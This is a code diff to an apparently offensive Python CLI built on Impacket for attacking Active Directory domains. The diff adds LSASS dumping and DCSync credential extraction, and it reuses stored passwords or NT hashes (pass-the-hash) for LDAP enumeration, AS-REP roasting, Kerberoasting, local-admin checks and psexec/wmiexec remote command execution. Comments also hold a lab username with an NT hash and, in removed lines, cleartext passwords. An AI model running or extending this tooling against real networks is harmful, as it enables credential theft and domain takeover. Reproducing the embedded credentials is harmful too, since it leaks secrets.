@@ -5,11 +5,12 @@ from pympacket.utils.check_admin_smb import check_admin_smb
 from pympacket.utils.storage import Storage, load_storage, save_storage
 from pympacket.utils.lateral import psexec, wmiexec
 from pympacket.utils.bruteforce import bruteforce
+from pympacket.utils.dump_lsass import dump_lsass
+from pympacket.utils.dcsync import dcsync
 import argparse
-from pprint import pprint
 import cmd
 import os
-from pympacket.models.common import Domain, User, Hash, Computer
+from pympacket.models.common import Domain, Computer
 import re
 
 def ipv4_address(value):
@@ -78,21 +79,27 @@ def ldap_enum_output(ldap, conn, domain_base, domain, dc_ip):
 class ImpacketCLI(cmd.Cmd):
     prompt = '>> '
     intro = 'Welcome to Pympacket. Type "help" for available commands.'
+    selected = None # Currently selected user
     storage: Storage
 
     def __init__(self):
         super().__init__()
+        #self.storage = Storage()
         self.storage = load_storage()
 
     def save_user(self, users):
-        found = False
         for user in users:
+            found = False
             for saved_user in self.storage.users:
                 if user.username == saved_user.username:
                     found = True
-                    if len(saved_user.krb_hash) == 0: # Test this shit
+                    if saved_user.nthash == None and user.nthash != None:
+                        saved_user.nthash = user.nthash
+                    if saved_user.aes256 == None and user.aes256 != None:
+                        saved_user.aes256 = user.aes256
+                    if len(saved_user.krb_hash) == 0 and len(user.krb_hash) > 0:
                         (saved_user.krb_hash).append(user.krb_hash)
-                        save_storage(self.storage)
+                    save_storage(self.storage)
             if not found:
                 self.storage.users.append(user)
                 save_storage(self.storage)
@@ -122,6 +129,28 @@ class ImpacketCLI(cmd.Cmd):
             self.storage.domain_info = domain_info
             save_storage(self.storage)
 
+    def do_select_user(self, args):
+        """miammiao."""
+        parser = argparse.ArgumentParser(prog='select_user', description='List saved users.')
+        parser.add_argument('-u', '--user', type=str, required=True, help='The username to test.')
+        args = parser.parse_args(args.split())
+        found = False
+        for user in self.storage.users:
+            if args.user == user.username:
+                found = True
+                if user.password != None or user.nthash != None:
+                    self.selected = user
+                    self.prompt = f"({user.username}) >> "
+                else:
+                    print("\nA valid user is found in storage, but no credentials are attached to them.\n")
+        
+        if not found:
+            print("\nNo user is found in storage with that exact username.\n")
+
+    def do_deselect_user(self, args):
+        self.selected = None
+        self.prompt = ">> "
+
     def do_enum(self, args):
         """ Perform Domain Enumeration """
         parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
@@ -135,15 +164,21 @@ class ImpacketCLI(cmd.Cmd):
         group.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'kerberoast', 'ldap', 'admin'] , required=False, default='auto', help='What kind of enumeration to perform.')
         args = parser.parse_args(args.split())
 
-        if (args.username and (args.password or args.nthash)):
-            # Credentialed        
+        if (args.username and (args.password or args.nthash)) or self.selected != None:
+            # Credentialed
             if args.type == 'auto' or args.type == 'ldap':
                 ldap = ldap_enum()
-                if args.nthash == None: # Password login
-                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
+                if self.selected == None:
+                    if args.nthash == None: # Password login
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
                 else:
-                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
-                
+                    if self.selected.password != None:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.nthash, domain=args.domain, pth=True)
+
                 # LDAP Enumeration Output
                 domain_info = ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
                 self.save_domain(domain_info)
@@ -151,20 +186,33 @@ class ImpacketCLI(cmd.Cmd):
                 # Enumerate Administrative Privilege
             if args.type == 'auto' or args.type == 'admin':
                 ldap = ldap_enum()
-                if args.nthash == None: # Password login
-                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
+                if self.selected == None:
+                    if args.nthash == None: # Password login
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
                 else:
-                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
+                    if self.selected.password != None:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.nthash, domain=args.domain, pth=True)
                     
                 domain_computers = ldap.enum_computers(conn, domain_base, args.dc_ip)
                 print("Checking if the current user is a Local Administrator on a Domain Computer:")
                 admin_on = []
                 for computer in domain_computers:
                     if computer['ip_address']:
-                        if args.nthash == None:
-                            result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, password=args.password)
+
+                        if self.selected == None:
+                            if args.nthash == None: # Password login
+                                result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, password=args.password)
+                            else:
+                                result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, nthash=args.nthash)
                         else:
-                            result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, nthash=args.nthash)
+                            if self.selected.password != None:
+                                result = check_admin_smb(target=computer['ip_address'], username=self.selected.username, domain=args.domain, password=self.selected.password)
+                            else:
+                                result = check_admin_smb(target=computer['ip_address'], username=self.selected.username, domain=args.domain, nthash=self.selected.nthash)
                         if result:
                             admin_on.append(computer['name'])
                     
@@ -176,7 +224,14 @@ class ImpacketCLI(cmd.Cmd):
                 print("")
 
             if args.type == 'auto' or args.type == 'asrep':
-                asrep_out = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, domain=args.domain)
+                if self.selected == None:
+                    asrep_out = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+                else:
+                    if self.selected.password != None:
+                        asrep_out = asreproast(dc_ip=args.dc_ip, username=self.selected.username, password=self.selected.password, domain=args.domain)
+                    else:
+                        asrep_out = asreproast(dc_ip=args.dc_ip, username=self.selected.username, nthash=self.selected.nthash, domain=args.domain)
+                        
                 if asrep_out != None:
                     if len(asrep_out):
                         print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
@@ -188,7 +243,13 @@ class ImpacketCLI(cmd.Cmd):
                         print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")
 
             if args.type == 'auto' or args.type == 'kerberoast':
-                tgs_out = kerberoast(username=args.username, password=args.password, nthash=args.nthash, dc_ip=args.dc_ip, domain=args.domain)
+                if self.selected == None:
+                    tgs_out = kerberoast(username=args.username, password=args.password, nthash=args.nthash, dc_ip=args.dc_ip, domain=args.domain)
+                else:
+                    if self.selected.password != None:
+                        tgs_out = kerberoast(dc_ip=args.dc_ip, username=self.selected.username, password=self.selected.password, domain=args.domain)
+                    else:
+                        tgs_out = kerberoast(dc_ip=args.dc_ip, username=self.selected.username, nthash=self.selected.nthash, domain=args.domain)                
                 if tgs_out != None:
                     if len(tgs_out):
                         print("Kerberoasted the following users and stored their TGS for future bruteforce:")
@@ -233,19 +294,25 @@ class ImpacketCLI(cmd.Cmd):
         parser = argparse.ArgumentParser(prog='exec', description='Spawn a shell on a system, if enough privileges are provided.')
         parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
         parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
+        parser.add_argument('-c', '--cmd', type=str, required=True, help='The command to execute')
         group = parser.add_argument_group()
-        group.add_argument('-u', '--username', type=str, required=True, help='The username to test.')
+        group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
         group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to test.')
         group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
         group.add_argument('-m', '--mode', type=str, choices=['wmiexec', 'psexec'] , required=False, default='psexec', help='What kind of enumeration to perform.')
         args = parser.parse_args(args.split())
         #d.garza
         #5a642013439f0ab8721115d3a87068db
-        # fix cmd class input catching!!!
         if args.mode == 'psexec':
-            psexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+            if self.selected == None:
+                psexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain, cmd=args.cmd)
+            else:
+                psexec(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain, cmd=args.cmd)                 
         else:
-            wmiexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+            if self.selected == None:
+                wmiexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain, cmd=args.cmd)
+            else:
+                wmiexec(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain, cmd=args.cmd)
 
     def do_bruteforce(self, args):
         """ miao miao miao """
@@ -262,22 +329,44 @@ class ImpacketCLI(cmd.Cmd):
                         if hash.type == 'asrep' and (args.type == 'all' or args.type == 'asrep'):
                             password = bruteforce(args.wordlist, hash)
                             if password:
+                                user.password = password
+                                save_storage(self.storage)
                                 cracked_asrep.append(user.username)
                         if hash.type == 'tgs' and (args.type == 'all' or args.type == 'tgs'):
                             password = bruteforce(args.wordlist, hash)
                             if password:
+                                user.password = password
+                                save_storage(self.storage)
                                 cracked_tgs.append(user.username)
+        if len(cracked_asrep):
+            print("Cracked the ASREP Hashes for the following users:")
+            for user in cracked_asrep:
+                print(user)
+            print("")
+        else:
+            print("No ASREP Hashes were able to be cracked.\n")
+
+        if len(cracked_tgs):
+            print("Cracked the TGS Hashes for the following users:")
+            for user in cracked_tgs:
+                print(user)
+            print("")
+        else:
+            print("No TGS Hashes were able to be cracked.\n")
 
     def do_list_users(self, args):
         """List users credentials."""
         parser = argparse.ArgumentParser(prog='list_users', description='List saved users.')
         parser.add_argument('--hash', action='store_true', required=False, default=False, help='The username to test.')
         parser.add_argument('--cleartext', action='store_true', required=False, default=False, help='The password to test.')
+        parser.add_argument('-f', '--filter', type=str, required=False, help='Username to filter.')
         args = parser.parse_args(args.split())
 
         if len(self.storage.users):
             print("\nCurrently saved Domain Users:")
             for user in self.storage.users:
+                if args.filter != None and args.filter not in user.username:
+                    continue
                 print(f"Username: {user.username}")
 
                 if user.password != None:
@@ -295,6 +384,14 @@ class ImpacketCLI(cmd.Cmd):
                         print(f"NTLM Hash: Saved")
                 else:
                     print("NTLM Hash: Not saved")
+
+                if user.aes256 != None:
+                    if args.cleartext:
+                        print(f"AES256 Key: {user.aes256}")
+                    else:
+                        print(f"AES256 Key: Saved")
+                else:
+                    print("AES256 Key: Not saved")
                 
                 if len(user.krb_hash):
                     if args.hash:
@@ -348,6 +445,59 @@ class ImpacketCLI(cmd.Cmd):
         else:
             print("No Domain data stored in memory.\n")
 
+    def do_lsass_dump(self, args):
+        """ miao miao miao """
+        parser = argparse.ArgumentParser(prog='lsass_dump', description='Spawn a shell on a system, if enough privileges are provided.')
+        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
+        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
+        group = parser.add_argument_group()
+        group.add_argument('-u', '--username', type=str, required=False, default='', help='The username to test.')
+        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to test.')
+        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
+        args = parser.parse_args(args.split())
+
+        if self.selected == None:
+            user_creds = dump_lsass(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+        else:
+            user_creds = dump_lsass(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain)                 
+
+        #user_creds = dump_lsass(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+        if user_creds != None:
+            if len(user_creds):
+                print("\nThe following users were extracted from the lsass dump:")
+                for user in user_creds:
+                    print(user.username)
+                print("")
+                self.save_user(user_creds)
+            else:
+                print("No user accounts were extracted from the lsass dump.\n")
+
+    def do_dcsync(self, args):
+        """ miao miao miao """
+        parser = argparse.ArgumentParser(prog='dcsync', description='Spawn a shell on a system, if enough privileges are provided.')
+        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
+        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
+        group = parser.add_argument_group()
+        group.add_argument('-u', '--username', type=str, required=False, default='', help='The username to test.')
+        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to test.')
+        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
+        args = parser.parse_args(args.split())
+
+        if self.selected == None:
+            user_creds = dcsync(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+        else:
+            user_creds = dcsync(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain)                 
+
+        if user_creds != None:
+            if len(user_creds):
+                print("\nThe following users were extracted from the dcsync:")
+                for user in user_creds:
+                    print(user.username)
+                print("")
+                self.save_user(user_creds)
+            else:
+                print("No user accounts were extracted from the dcsync.\n")
+
     def do_clear(self, args):
         """Clear the CLI."""
         # For Windows
@@ -362,26 +512,10 @@ class ImpacketCLI(cmd.Cmd):
         self.storage = Storage()
         save_storage(self.storage)
 
-    def do_quit(self, line):
+    def do_quit(self, args):
         """Exit the CLI."""
         save_storage(self.storage)
         return True
-
-
-
-cmdLineOptions = argparse.Namespace(
-    #username='m.summers',
-    #password='&e}h.aj)9?g*',
-    #username='l.douglas',
-    #password='Football1',
-    username=None,
-    password=None,
-    domain='contoso.local',
-    dc_ip='192.168.116.10',
-    wordlist='/home/sumzero/pympacket/SamAccountNames.txt',
-    type='auto', # 'auto', 'asrep', 'kerberoast', 'ldap', 'admin'
-    nthash=None
-)
 
 def main():
     cli = ImpacketCLI()
@@ -390,5 +524,4 @@ def main():
 # Entry point of the script
 if __name__ == "__main__":
     main()
-
-#enumeration(cmdLineOptions)
+    
